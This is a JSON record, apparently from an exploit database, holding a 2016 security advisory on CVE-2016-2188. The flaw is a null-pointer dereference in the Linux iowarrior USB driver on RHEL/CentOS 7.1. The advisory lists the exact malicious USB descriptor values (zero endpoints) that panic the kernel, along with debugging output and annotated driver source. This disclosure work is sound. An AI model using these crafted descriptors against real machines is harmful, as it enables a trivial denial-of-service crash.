{
    "text": "ecve : CVE-2016-2188 ， title : Linux Kernel 3.10.0-229.x ( CentOS / RHEL 7.1 ) - 'iowarrior' Driver Crash ( PoC ) - Linux dos Exploit ， verified : Not Verified ， exploit_detail : OS-S Security Advisory 2016-15 ， Linux iowarrior Nullpointer Dereference ， Date : March 4th , 2016 ， Authors : Sergej Schumilo , Hendrik Schwartke , Ralf Spenneberg ， CVE : not yet assigned ， CVSS : 4.9 ( AV : L/AC : L/Au : N/C : N/I : N/A : C )  ， Title : Local RedHat Enterprise Linux DoS ?? RHEL 7.1 Kernel crashes on invalid ， USB device descriptors ( iowarrior driver )  ， Severity : Critical. The Kernel panics. A reboot is required. ， Ease of Exploitation : Trivial ， Vulnerability type : Wrong input validation ， Products : RHEL 7.1 including all updates ， Kernel-Version : 3.10.0-229.20.1.el7.x86_64 ( for debugging-purposes we used the ， CentOS Kernel kernel-debuginfo-3.10.0-229.14.1.el7 )  ， Vendor : Red Hat ， Vendor contacted : November , 12th 2015 ， PDF of advisory :  ， Abstract :  ， The Kernel 3.10.0-229.20.1.el7.x86_64 crashes on presentation of a buggy USB ， device requiring the iowarrior driver. ， Detailed product description :  ， We confirmed the bug on the following system :  ， RHEL 7.1 ， Kernel 3.10.0-229.20.1.el7.x86_64 ， Further products or kernel versions have not been tested. ， How reproducible : Always ， Actual results : Kernel crashes. ， Description :  ， The bug was found using the USB-fuzzing framework vUSBf from Sergej Schumilo ，  ( github.com/schumilo ) using the following device descriptor :  ，  [  *  ] Device-Descriptor ， bLength : 0x12 ， bDescriptorType : 0x1 ， bcdUSB : 0x200 ， bDeviceClass : 0x3 ， bDeviceSubClass : 0x0 ， bDeviceProtocol : 0x0 ， bMaxPacketSize : 0x40 ， idVendor : 0x7c0 ， idProduct : 0x1500 ， bcdDevice : 0x100 ， iManufacturer : 0x1 ， iProduct : 0x2 ， iSerialNumbers : 0x3 ， bNumConfigurations : 0x1 ， This is the configuration descriptor containing the malicious value for ， bNumEndpoints causing the crash. A zero value for bNumEndpoints crashes the ， system. ，  [  *  ] Configuration-Descriptor ， bLength : 0x9 ， bDescriptorType : 0x2 ， wTotalLength : 0x27 ， bNumInterfaces : 0x1 ， bConfigurationValue : 0x1 ， iConfiguration : 0x0 ， bmAttributes : 0x0 ， bMaxPower : 0x31 ，  [  *  ] Interface-Descriptor ， bLength : 0x9 ， bDescriptorType : 0x4 ， bInterfaceNumber : 0x0 ， bAlternateSetting : 0x0 ， bNumEndpoints : 0x0 ， bInterfaceClass : 0x0 ， bInterfaceSubClass : 0x0 ， bInterfaceProtocol : 0x0 ，  [  *  ] Endpoint-Descriptor :  ， bLength : 0x7 ， bDescriptorType : 0x5 ， bEndpointAddress : 0x81 ， bmAttribut : 0x3 ， wMaxPacketSize : 0x404 ， bInterval : 0xc ，  [  *  ] Endpoint-Descriptor :  ， bLength : 0x7 ， bDescriptorType : 0x5 ， bEndpointAddress : 0x1 ， bmAttribut : 0x2 ， wMaxPacketSize : 0x4 ， bInterval : 0xc ，  [  *  ] Endpoint-Descriptor :  ， bLength : 0x7 ， bDescriptorType : 0x5 ， bEndpointAddress : 0x82 ， bmAttribut : 0x1 ， wMaxPacketSize : 0x4 ， bInterval : 0xc ， The iowarrior driver assumes that there will be at least one IN-endpoint- ， descriptor. ， If the interface-descriptor contains a zero-value for bNumEndpoints or no IN- ， endpoint-descriptor is provided , the driver tries to dereference a null- ， pointer and the kernel crashes :  ，  $ nm iowarrior.ko.debug | grep iowarrior_probe ， 00000000000012a0 t iowarrior_probe ，  $ addr2line -e iowarrior.ko.debug 0x13D4 ， /usr/src/debug/kernel-3.10.0-229.14.1.el7/linux-3.10.0-229.14.1.el7.x86_ ， 64/include/uapi/linux/usb/ch9.h : 605 ， CentOS-Kernel linux-3.10.0-229.14.1.el7 ( includes/uapi/linux/usb/ch9.c )  ， 603 static inline int usb_endpoint_maxp ( const struct usb_endpoint_descriptor ，  * epd ) / * used by iowarrior_probe * / ， 604 { ， 605 return __le16_to_cpu ( epd->wMaxPacketSize )  ; / * Possible Nullpointer ， Dereference * / ， 606 } ， CentOS-Kernel linux-3.10.0-229.14.1.el7 ( drivers/usb/misc/iowarrior.c )  ， 790 / * set up the endpoint information * / ， 791 for ( i = 0 ; i < iface_desc->desc.bNumEndpoints ; ++i ) { ， 792 endpoint = &iface_desc->endpoint [ i ] .desc ;  ， 793 ， 794 if ( usb_endpoint_is_int_in ( endpoint )  )  ， 795 dev->int_in_endpoint = endpoint ; / * Nullpointer if never set * / ， 796 if ( usb_endpoint_is_int_out ( endpoint )  )  ， 797 / * this one will match for the IOWarrior56 only * / ， 798 dev->int_out_endpoint = endpoint ;  ， 799 } ， 800 / * we have to check the report_size often , so remember it in the ， endianness suitable for our machine * / ， 801 dev->report_size = usb_endpoint_maxp ( dev->int_in_endpoint )  ; / * Nullpointer ， 802 if (  ( dev->interface->cur_altsetting->desc.bInterfaceNumber == 0 )  ， 803 ( dev->product_id == USB_DEVICE_ID_CODEMERCS_IOW56 )  )  ， 804 / * IOWarrior56 has wMaxPacketSize different from report size * / ， 805 dev->report_size = 7 ; ",
    "time": "2016-03-14"
}